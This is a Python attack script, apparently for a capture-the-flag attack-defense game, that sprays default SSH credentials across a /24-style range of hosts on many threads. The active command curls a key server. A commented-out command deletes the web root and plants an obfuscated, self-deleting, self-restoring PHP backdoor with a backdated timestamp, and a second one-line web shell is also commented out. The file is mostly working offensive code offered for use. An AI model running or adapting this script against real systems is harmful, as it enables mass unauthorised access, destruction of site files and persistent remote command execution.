import paramiko
import threading


def ssh_exec(target):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(hostname=target, port=config['port'], username=config['username'],
                    password=config['password'], timeout=3)
        stdin, stdout, stderr = ssh.exec_command(config['command'], timeout=3)
        echo(stdout.read().decode())
        ssh.close()
    except Exception as e:
        pass


def echo(text):
    text = text

    with open(config['logFile'], 'a+') as f:
        f.write(text+"\n")

        print(text)


if __name__ == '__main__':
    #不死马 post passwd=jonathan&jonathan=
    shell = "<?php error_reporting(0);set_time_limit(0);ignore_user_abort(1);  unlink(__FILE__); \$file = '.config.php';\$code = base64_decode('PD9waHAgaWYobWQ1KCRfUE9TVFsncGFzc3dkJ10pPT09Jzc4ODQyODE1MjQ4MzAwZmE2YWU3OWY3Nzc2YTUwODBhJykgIHN5c3RlbSgkX1BPU1RbJ2pvbmF0aGFuJ10pOyAgPz4=');while(true) {if(md5(file_get_contents(\$file))!==md5(\$code)) {file_put_contents(\$file, \$code);}system('chmod 777 .config.php');touch('.config.php',mktime(20,15,1,11,28,2016));usleep(100);}?>"
    #普通一句话
    #shell = "<?php system(\$_POST[jonathan]);?>"
    config = {
        'username': 'testu',
        'password': '123456',
        'port': 22,
        #'command': f'cat /flag.txt;rm -rf /var/www/html/*;echo "{shell}" > /var/www/html/index.php;chmod 777 /var/www/html/index.php; echo "404_not_found" > /var/www/html/index.html',
        'command': 'curl 172.17.120.6/getkey',
        'logFile': 'key.txt'
    }
    targets = []

    ip = "4.4.%s.100"
    for i in range(1, 255):
        targets.append(ip % i)

    for target in targets:
        t = threading.Thread(target=ssh_exec, args=(target,))
        t.start()
